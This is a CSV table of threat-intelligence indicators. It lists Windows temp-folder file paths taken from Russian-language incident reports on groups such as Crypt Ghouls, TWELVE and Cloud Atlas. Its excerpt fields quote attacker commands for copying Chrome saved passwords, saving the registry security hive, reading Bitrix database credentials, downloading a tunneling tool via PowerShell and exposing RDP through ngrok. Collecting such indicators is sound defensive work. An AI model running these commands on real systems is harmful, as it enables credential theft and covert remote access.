schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:36d49b51f76460d8047b17638e34ff79428d69f1df53a479acae21a3c5b6c1a3,observation--sha256:34ddff841581b808c4fa6e8a664917b64f77bc82611496c1195711ab1c0b998e,file-path,C:\Windows\Temp;,C:\Windows\Temp,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 74}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.001 PowerShell Атакующие использовали PowerShell для выполнения команд на хостах жертвы: T1059.003 Windows Command Shell Атакующие также использовали cmd.exe для выполнения команд на хостах: T1059.004 Unix Shell Для запуска Babuk на серверах ESXi атакующие использовали Unix Shell: Execution cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\ qnLJbp 2>&1"" powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile ltn.zip -usebasicparsing; expand-ar",
1.0.0,actor--anonymous,artifact--sha256:36d49b51f76460d8047b17638e34ff79428d69f1df53a479acae21a3c5b6c1a3,observation--sha256:67f2849d3302259eb53192c09e21917686d0cce345e83d28ce65ad887848010d,file-path,C:\Windows\Temp;,C:\Windows\Temp,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 83}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TWELVE и BlackJack активно использовали ngrok в то время, как Crypt Ghouls применяли localtonet для туннелирования. Для доставки утилиты злоумышленники скачали утилиту с сайта localtonet через PowerShell: Ранее мы предположили, что существует пересечение участников группировки BlackJack и TWELVE либо координация между командами в рамках одной или нескольких совместных операций. Вторая гипотеза заключается в том, что Crypt Ghouls является либо последующим перерождением TWELVE, либо отколовшейся г",
1.0.0,actor--anonymous,artifact--sha256:fe6f01aabbdae8c2a2a30a72dc3b2b04d33f013fb7a85dbc3fd4c6cd98450ccd,observation--sha256:3871f2bc360a63151c42e6f45b66b89982c01ef1de642e3fed878f67c7c3a302,file-path,C:\Windows\Temp\1713909129.8364425,C:\Windows\Temp\1713909129.8364425,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 74}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.001 PowerShell Атакующие использовали PowerShell для выполнения команд на хостах жертвы: T1059.003 Windows Command Shell Атакующие также использовали cmd.exe для выполнения команд на хостах: T1059.004 Unix Shell Для запуска Babuk на серверах ESXi атакующие использовали Unix Shell: Execution cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\ qnLJbp 2>&1"" powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile ltn.zip -usebasicparsing; expand-ar",
1.0.0,actor--anonymous,artifact--sha256:c4a5d23695e0e13c81085e130d1da2c9bc87a440f5ddb8d4602483b7cad3707a,observation--sha256:606ef0dac9135fbd2800aabf1398716c8309812a065f8241ab74dc6a97fcb099,file-path,C:\Windows\Temp\1713909173.8739672,C:\Windows\Temp\1713909173.8739672,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 282}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Bitrix Доступ к паролям веб-браузеров Еще одним способом сбора учетных данных является анализ конфигурационных файлов Bitrix, которые могут содержать в себе учетные данные (логин и пароль) для подключения к базам данных, а также адрес и имя баз данных. Вот пример одной из команд, используемых атакующими: Команда копирует файл с паролями из профиля пользователя Google Chrome во временную папку Windows (T1555.003 Credentials from Web Browsers) . cat /home/bitrix/ext_www/*/*/php_interface/dbconn.ph",
1.0.0,actor--anonymous,artifact--sha256:c4a5d23695e0e13c81085e130d1da2c9bc87a440f5ddb8d4602483b7cad3707a,observation--sha256:6cf19767527b63abf93616afb0e73f0ecd196dc5f8b6cb2e43bc74b9912bf4a2,file-path,C:\Windows\Temp\1713909173.8739672,C:\Windows\Temp\1713909173.8739672,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 77}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\System32\svchost.exe -k localService -p -s RemoteRegistry RegSaveKey(""$hklm\security"",""$temp\kjzcehld.tmp"") .\gpo_compliance.ps1 cmd.exe /Q /c c:\programdata\allinone2023\XenAllPasswordPro.exe -a c:\ programdata\report.html 1> \Windows\Temp\LNhkey 2>&1 cmd.exe /Q /c copy ""C:\Users\[username]\AppData\Local\Google\Chrome\User Data\Default\Login Data"" ""C:\Windows\Temp\1713909173.8739672"" T1003.002 Security Account Manager Crypt Ghouls использовали Secretsdump (Impacket) для извлечения уч",
1.0.0,actor--anonymous,artifact--sha256:477fd00fdfe41c44183f81484f3a6bf54da2059d3bcf868b16e2b75476ffc28d,observation--sha256:bf4da59368812f941c06d60c8417b0f0e9bc67f804d22496b746434ca1eaadb5,file-path,C:\Windows\Temp\Rar.exe,C:\Windows\Temp\Rar.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--34685a2ac42dfdf7,Anonymous/kaspersky-ics-cert-ttps-of-cyber-partisans-activity-aimed-at-espionage-and-disruption-ru.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,34 © 2025 АО «ЛАБОРАТОРИЯ КАСПЕРСКОГО» c:\program files\realtek\audio\hda\rtkaudioservice.exe c:\program files\teamviewer\version9\tv_w64.exe c:\teamviewer\version9\tv_w640001.exe c:\users\user\appdata\roaming\telegram desktop\telegramupdater.exe c:\users\user\appdata\roaming\telegram desktop\update0002.exe c:\users\user\appdata\roaming\telegram desktop\updater.exe c:\windows 2016 update\wsus.exe c:\windows 2016 update\wsus0001.exe c:\windows\bddeeeee.sys c:\windows\bits.exe c:\windows\def.dll c,
1.0.0,actor--anonymous,artifact--sha256:c7e958167569ff177f0d8eb2764e7a17e4bb43ad43aba85cba1a181e2be98716,observation--sha256:1b28a305dcd46c8420fd859772078c9d7df9066f69525514f012c618a9f37f7f,file-path,C:\Windows\Temp\heyy\EkranSystem_7.0.813.0_Incl_LicMaker_uCare@Pwners.7z,C:\Windows\Temp\heyy\EkranSystem_7.0.813.0_Incl_LicMaker_uCare@Pwners.7z,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы T1087 Account Discovery Помимо этого, группа использовала командлеты модуля PowerView для обнаружения учетных записей пользователей домена: T1069 Permission Groups Discovery Информацию о группах домена TWEL VE получала при помощи PowerShell: В рамках пользовательской сессии злоумышленники выполняют команду: Файл ad_ru.ps1 является утилитой для разведки Active Directory ADRecon. Через использование интернет-браузера Google Chrome группиро",
1.0.0,actor--anonymous,artifact--sha256:bce72d983a56c3a047c686dd28f4cf00ec35ce91d62e38e8d32a245022120a78,observation--sha256:23c4efbeee5780265f9a4c5832b370614464e7b2fc3af1cc59ba06fae3aeee74,file-path,C:\Windows\Temp\lsass.exe,C:\Windows\Temp\lsass.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 284}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Атакующие устанавливали ngrok сразу после подключения к системе и прописывали в файле конфигурации порт 3389 (стандартный порт RDP). После этого все нелегитимные подключения к системе по RDP проходили через эту утилиту. Злоумышленники прикрепляли ngrok к службе под названием svchost при помощи следующей команды: Кроме порта RDP, атакующие использовали порт 80 HTTP: .\\ngrok.exe tcp 3389 Start-Process -FilePath ""ngrok.exe"" -WindowStyle Hidden -ArgumentList 'tcp 3389' .\\ngrok.exe config add-autht",
1.0.0,actor--anonymous,artifact--sha256:9a35f93fe8964eb3c45eccccf0bfa086bd425bb792753a5d736573a74f86e43b,observation--sha256:132fb08dd8aa2ef9054644ce428a2bb97afed812a1054f135f66a4431ebd1282,file-path,C:\Windows\Temp\lsass.exe Утилита ngrok,C:\Windows\Temp\lsass.exe Утилита ngrok,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 200}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1572 Protocol Tunneling ngrok В ходе расследования инцидентов группы Cloud Atlas мы обнаружили частое использование утилиты туннелирования ngrok. Злоумышленники обычно размещали ее во временных каталогах, а также использовали файл конфигурации в формате YAML. T1090.003 Proxy: Multi-hop Proxy T1573.002 Encrypted Channel: Asymmetric Cryptography Tor-client Еще одна интересная вещь, которую мы обнаружили при расследовании инцидентов, заключается в том, что группа использует TOR-клиент для переадре",
1.0.0,actor--anonymous,artifact--sha256:bd9557da06c75293f8c05e9fee4ba0446bb3007847f9802163bd51d4a85effde,observation--sha256:94811cb584b37d6f85e0e166256a6e2097020d45537785f783af4d9d1d1d614b,file-path,C:\Windows\Temp\nano.exe,C:\Windows\Temp\nano.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 278}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Nanodump Nanodump — это легковесная утилита с открытым исходным кодом, предназначенная для снятия дампа памяти процесса LSASS (Local Security Authority Subsystem Service) в Windows. Nanodump создает дамп LSASS без использования стандартных инструментов Windows (как comsvcs.dll или MiniDumpWriteDump), что помогает обойти антивирусы и EDR-системы. Файл является утилитой nanodump для дампа процесса lsass.exe. В системе были созданы файлы С:\Windows\Temp\2024[REDACTED].log и С:\Windows\ Temp\2024[RE",
